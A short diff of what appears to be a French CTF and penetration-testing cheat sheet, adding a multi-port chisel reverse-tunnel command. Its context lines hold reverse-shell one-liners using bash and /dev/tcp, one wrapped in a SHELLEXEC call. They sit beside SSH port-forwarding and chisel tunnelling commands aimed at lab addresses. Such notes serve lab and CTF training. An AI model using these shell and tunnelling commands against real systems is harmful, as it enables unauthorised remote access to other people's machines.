@@ -34,7 +34,7 @@ CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/1234 0>&1')
 - `bash -i >& /dev/tcp/10.8.218.133/1234 0>&1` --> Elévation de privilèges
 
 - SSH Port Forwording --> `ssh sau@10.10.11.214 -L 8000:127.0.0.1:80` (attaquant --> 8000, victime --> 80)
-- Chisel port forwarding --> `chisel server -p 8888 --reverse` puis `chisel.exe client 10.10.16.9:8888 R:4444:127.0.0.1:4444`
+- Chisel port forwarding --> `chisel server -p 8888 --reverse` puis `chisel.exe client 10.10.16.9:8888 R:4444:127.0.0.1:4444`, plusieurs ports `./chisel_1.10.0_linux_amd64 client 10.10.16.25:8888 R:40056:127.0.0.1:40056 R:5000:127.0.0.1:5000 R:7096:127.0.0.1:7096`
 
 - WU CTF Mars@Hack --> https://gitlab.com/marshack/writeups/ctf_2024
 
